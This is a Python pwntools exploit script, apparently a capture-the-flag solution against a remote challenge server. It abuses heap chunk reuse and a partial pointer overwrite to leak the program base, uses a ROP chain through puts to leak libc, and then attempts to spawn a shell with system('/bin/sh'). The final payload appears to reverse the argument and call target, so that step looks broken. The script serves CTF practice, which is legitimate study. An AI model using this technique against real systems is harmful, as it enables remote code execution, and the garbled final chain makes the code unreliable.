# coding:utf-8

from pwn import *

context.log_level = 'debug'
proc_name = 'pwn-f'
# p = process(proc_name)
p = remote('node4.buuoj.cn', 27714)
elf = ELF(proc_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# PIE debug
def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def create(size, content, isDebug):
    p.sendlineafter('3.quit\n', 'create ')
    p.sendlineafter('Pls give string size:', str(size))
    if isDebug:
        debug(0xf76, 1)
    p.sendafter('str:', content + '\x00')

def delete(index, isDebug):
    p.sendlineafter('3.quit\n', 'delete ')
    p.sendlineafter('id:', str(index))
    if isDebug:
        debug(0xe37, 1)
    p.sendlineafter('Are you sure?:', 'yes')

def quit():
    p.sendlineafter('3.quit\n', 'quit ')

    
def pwn():
    ##
    # def create(size, content, isDebug)
    # def delete(index, isDebug)
    ##
    create(15, 'klose', 0)         # 申请一个堆块
    create(15, 'joyce', 0)         # 申请一个堆块
    delete(1, 0)
    delete(0, 0)
    # debug(0xee2)
    create(0x20, 'a'*24 + '\x1a', 0)
    # debug(0xd95, 1)
    delete(1, 0)
    
    # leak
    p.recvuntil('a' * 24)
    elf_base = u64(p.recv(6).ljust(8, '\x00')) - 0xd1a
    printf_plt = elf_base + 0x9d0
    puts_plt = elf_base + 0x990
    puts_got = elf_base + 0x202030

    # print
    log.success('elf_base => ' + hex(elf_base))
    log.success('printf_plt => ' + hex(printf_plt))
    log.success('puts_plt => ' + hex(puts_plt))
    log.success('puts_got => ' + hex(puts_got))

    pause()
    pop_4 = elf_base + 0x11dc
    pop_rdi = elf_base + 0x11e3
    log.success('pop_4 => ' + hex(pop_4))
    log.success('pop_rdi => ' + hex(pop_rdi))

    ############ pwn ############
    # payload1
    delete(0, 0)
    payload1 = 'a' * 24 + p64(pop_4)
    create(0x20, payload1, 0)

    # payload2
    p.sendlineafter('3.quit\n', 'delete ')
    p.sendlineafter('id:', '1')
    p.recvuntil('Are you sure?:')
    payload2 = 'yes' + 'a' * 5
    payload2 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
    payload2 += p64(elf_base + 0xc71)
    p.sendline(payload2)

    puts_addr = u64(p.recv(6).ljust(8, '\x00'))
    libc_base = puts_addr - libc.symbols['puts']
    one_gadget = libc_base + 0x45216
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + libc.search('/bin/sh').next()
    
    # print
    log.success('puts_addr => ' + hex(puts_addr))
    log.success('one_gadget => ' + hex(one_gadget))
    log.success('system_addr => ' + hex(system_addr))
    log.success('binsh_addr => ' + hex(binsh_addr))

    pause()

    # payload3
    delete(0, 0)
    create(0x20, payload1, 0)

    p.sendlineafter('3.quit\n', 'delete ')
    p.sendlineafter('id:', '1')
    p.recvuntil('Are you sure?:')
    payload3 = 'yes' + 'a' * 5
    payload3 += p64(pop_rdi) + p64(system_addr) + p64(binsh_addr)
    p.sendline(payload3)

    p.interactive()


if __name__ == '__main__':
    pwn()
